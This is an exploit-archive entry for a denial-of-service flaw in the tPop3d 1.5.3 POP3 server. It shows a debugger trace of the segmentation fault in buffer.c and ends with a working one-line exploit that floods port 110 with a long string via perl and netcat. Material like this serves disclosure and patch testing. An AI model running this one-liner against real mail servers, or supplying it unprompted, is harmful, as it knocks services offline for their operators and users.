# Exploit Title: tPop3d 1.5.3 DoS
# Date: 3/26/10
# Author: OrderZero
# Software Link: http://www.ex-parrot.com/~chris/tpop3d/
# Download: http://www.ex-parrot.com/~chris/tpop3d/tpop3d-1.5.3.tar.gz
# Version: 1.5.3
# Debug:
Starting program: /usr/local/sbin/tpop3d -d
listener_new: gethostbyaddr(0.0.0.0): cannot resolve name
listener_new: 0.0.0.0:110<http://0.0.0.0:110>: cannot obtain domain suffix for this address
listener_new: 0.0.0.0:110<http://0.0.0.0:110>: using fallback domain suffix `bt'
parse_listeners: listening on address 0.0.0.0:110<http://0.0.0.0:110>
1 authentication drivers successfully loaded
net_loop: tpop3d version 1.5.3 successfully started
listeners_post_select: client [7]192.168.1.146/bt<http://192.168.1.146/bt>: connected to local address 192.168.1.139:110<http://192.168.1.139:110>
Program received signal SIGSEGV, Segmentation fault.
0x0804b969 in buffer_consume_to_mark (B=0x8ef4ef0, mark=0x80572af "\n",
mlen=1, str=0x0, slen=0x805a440) at buffer.c:153
153 for (k = (int)mlen - 1; k < (int)a; k += skip[(unsigned char)mark[k]]) {


#exploit:
perl -e 'printf "a"x999999' | nc target 110